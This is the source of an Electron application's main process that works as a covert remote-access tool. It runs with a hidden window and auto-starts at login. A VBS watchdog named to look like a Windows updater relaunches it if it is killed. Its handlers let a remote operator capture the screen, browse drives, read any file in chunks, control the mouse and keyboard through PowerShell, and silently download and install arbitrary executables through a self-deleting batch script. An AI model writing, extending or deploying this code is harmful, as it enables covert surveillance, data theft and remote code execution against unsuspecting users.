const { app, BrowserWindow, ipcMain, desktopCapturer, shell, nativeImage } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const { exec, spawn } = require('child_process');

function startWatchdog() {
    // Only run the watchdog when the app is actually packaged as an EXE
    if (!app.isPackaged) return;

    const exePath = app.getPath("exe");
    const exeName = path.basename(exePath);
    const watchdogPath = path.join(app.getPath("userData"), "win_updater.vbs");

    const vbsCode = `
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
Do
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '${exeName}'")
    If colProcesses.Count = 0 Then
        If objFSO.FileExists("${exePath}") Then
            objShell.Run """${exePath}""", 0, False
        End If
    End If
    WScript.Sleep 5000
Loop
`;

    fs.writeFileSync(watchdogPath, vbsCode);

    // Kill any existing watchdog for our app, then start a new one
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, () => {
        const child = spawn('wscript.exe', [watchdogPath], {
            detached: true,
            stdio: 'ignore'
        });
        child.unref();
    });
}

let psControl = null;
function setupRemoteControl() {
    psControl = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '-']);
    const setupScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '
    [DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);
' -Name NativeMethods -Namespace Win32
function Move-Mouse { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0) }
function Click-Left { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(2, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(4, 0, 0, 0, 0) }
function Click-Right { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(8, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(16, 0, 0, 0, 0) }
function Scroll-Mouse { param($amount); [Win32.NativeMethods]::mouse_event(0x0800, 0, 0, $amount, 0) }
function Send-Text { param($txt); [System.Windows.Forms.SendKeys]::SendWait($txt) }
`;
    psControl.stdin.write(setupScript + '\n');
}

function createWindow() {
    const win = new BrowserWindow({
        show: false, // Make the window completely hidden
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    win.loadFile('index.html');
}

// Auto start the app in the background when the user logs into their laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
});

app.whenReady().then(() => {
    // Get all screen sources
    ipcMain.handle('get-sources', async () => {
        const sources = await desktopCapturer.getSources({ types: ['screen', 'window'] });
        return sources.map(source => ({
            id: source.id,
            name: source.name
        }));
    });

    // Provide the computer name so the admin knows which laptop it is
    ipcMain.handle('get-hostname', () => os.hostname());

    ipcMain.handle('get-version', () => app.getVersion());

    ipcMain.handle('get-drives', async () => {
        return new Promise((resolve) => {
            exec('powershell "[System.IO.DriveInfo]::GetDrives() | Select-Object -ExpandProperty Name"', (error, stdout) => {
                if (error) { resolve(['C:\\']); return; }
                const drives = stdout.split(/\r?\n/)
                    .map(line => line.trim())
                    .filter(line => /^[A-Z]:\\/i.test(line));
                if (drives.length > 0) resolve(drives);
                else resolve(['C:\\']);
            });
        });
    });

    ipcMain.handle('read-directory', async (event, dirPath) => {
        try {
            const items = await fs.promises.readdir(dirPath, { withFileTypes: true });
            // Limit to 250 items to prevent UI/Socket freeze
            const slicedItems = items.slice(0, 250);
            
            let completed = 0;
            const total = slicedItems.length;

            const result = await Promise.all(slicedItems.map(async (item) => {
                let thumbnail = null;
                const fullPath = path.join(dirPath, item.name);
                let isDir = item.isDirectory();
                
                if (item.isSymbolicLink()) {
                    try {
                        const stat = await fs.promises.stat(fullPath);
                        isDir = stat.isDirectory();
                    } catch(e) {} // If broken symlink, leave it as false
                }
                
                if (!isDir) {
                    const ext = path.extname(item.name).toLowerCase();
                    if (['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.webp'].includes(ext)) {
                        try {
                            let thumb = await nativeImage.createThumbnailFromPath(fullPath, { width: 60, height: 60 });
                            
                            // Fallback for images if OS thumbnail fails or is empty
                            if ((!thumb || thumb.isEmpty()) && ['.jpg', '.jpeg', '.png', '.gif', '.webp'].includes(ext)) {
                                const stats = await fs.promises.stat(fullPath);
                                // Fallback only for images < 10MB to avoid memory crash
                                if (stats.size < 10 * 1024 * 1024) {
                                    const img = nativeImage.createFromPath(fullPath);
                                    if (!img.isEmpty()) {
                                        thumb = img.resize({ width: 60 });
                                    }
                                }
                            }

                            if (thumb && !thumb.isEmpty()) {
                                thumbnail = thumb.toDataURL();
                            }
                        } catch (e) {
                            // Secondary fallback if createThumbnailFromPath throws an exception
                            if (['.jpg', '.jpeg', '.png', '.gif', '.webp'].includes(ext)) {
                                try {
                                    const stats = await fs.promises.stat(fullPath);
                                    if (stats.size < 10 * 1024 * 1024) {
                                        const img = nativeImage.createFromPath(fullPath);
                                        if (!img.isEmpty()) {
                                            thumbnail = img.resize({ width: 60 }).toDataURL();
                                        }
                                    }
                                } catch(fallbackErr) {}
                            }
                        }
                    }
                }

                completed++;
                if (total > 0 && (completed % 10 === 0 || completed === total)) {
                    const percent = Math.round((completed / total) * 100);
                    event.sender.send('dir-progress', percent);
                }

                return {
                    name: item.name,
                    path: fullPath,
                    isDirectory: isDir,
                    size: 0,
                    thumbnail: thumbnail
                };
            }));

            // Sort folders first
            result.sort((a, b) => b.isDirectory - a.isDirectory || a.name.localeCompare(b.name));
            return result;
        } catch(e) {
            return { error: e.message };
        }
    });

    ipcMain.handle('open-file', async (event, filePath) => {
        try {
            await shell.openPath(filePath);
            return true;
        } catch (e) {
            return false;
        }
    });

    ipcMain.handle('get-file-size', async (event, filePath) => {
        try {
            const stats = await fs.promises.stat(filePath);
            return stats.size;
        } catch(e) {
            return -1;
        }
    });

    ipcMain.handle('read-file-chunk', async (event, filePath, start, end) => {
        let fd = null;
        try {
            fd = await fs.promises.open(filePath, 'r');
            const length = end - start;
            const buffer = Buffer.alloc(length);
            await fd.read(buffer, 0, length, start);
            return buffer.toString('base64');
        } catch(e) {
            return null;
        } finally {
            if (fd) await fd.close();
        }
    });

    ipcMain.handle('remote-action', async (event, action) => {
        if (!psControl) setupRemoteControl();
        try {
            // Convert relative coordinates (0.0 to 1.0) to absolute mouse scale (0 to 65535)
            const absX = Math.round(action.x * 65535);
            const absY = Math.round(action.y * 65535);

            if (action.type === 'move') {
                psControl.stdin.write(`Move-Mouse ${absX} ${absY}\n`);
            } else if (action.type === 'click') {
                psControl.stdin.write(`Click-Left ${absX} ${absY}\n`);
            } else if (action.type === 'rclick') {
                psControl.stdin.write(`Click-Right ${absX} ${absY}\n`);
            } else if (action.type === 'scroll') {
                psControl.stdin.write(`Scroll-Mouse ${action.amount}\n`);
            } else if (action.type === 'type') {
                // escape for powershell single quotes
                let safeTxt = action.text.replace(/'/g, "''");
                psControl.stdin.write(`Send-Text '${safeTxt}'\n`);
            }
        } catch(e) {}
    });

    let updateStream = null;
    const updateExePath = path.join(os.tmpdir(), 'cml_update.exe');

    ipcMain.handle('start-update', () => {
        try {
            if (fs.existsSync(updateExePath)) fs.unlinkSync(updateExePath);
            updateStream = fs.createWriteStream(updateExePath);
            return true;
        } catch(e) {
            return false;
        }
    });

    ipcMain.handle('write-update-chunk', (event, base64Data) => {
        if (updateStream) {
            const buffer = Buffer.from(base64Data, 'base64');
            updateStream.write(buffer);
            return true;
        }
        return false;
    });

    ipcMain.handle('finish-update-and-install', () => {
        if (updateStream) {
            updateStream.end(() => {
                const exePath = app.getPath("exe");
                const batPath = path.join(os.tmpdir(), 'install_cml_update.bat');

                const batCode = `
@echo off
timeout /t 3 /nobreak > nul
start /wait "" "${updateExePath}" /S
timeout /t 3 /nobreak > nul
start "" "${exePath}"
del "${updateExePath}"
del "%~f0"
`;
                fs.writeFileSync(batPath, batCode);
                const child = spawn('cmd.exe', ['/c', batPath], {
                    detached: true,
                    windowsHide: true,
                    stdio: 'ignore'
                });
                child.unref();
                app.quit();
            });
            return true;
        }
        return false;
    });

    createWindow();
    startWatchdog();
});

// Keep running in the background even if a window is closed
app.on('window-all-closed', () => {
    // Do nothing, we want it to stay alive
});

// When the installer/updater kills the app, stop the watchdog so it doesn't fight the installer
app.on('before-quit', () => {
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`);
});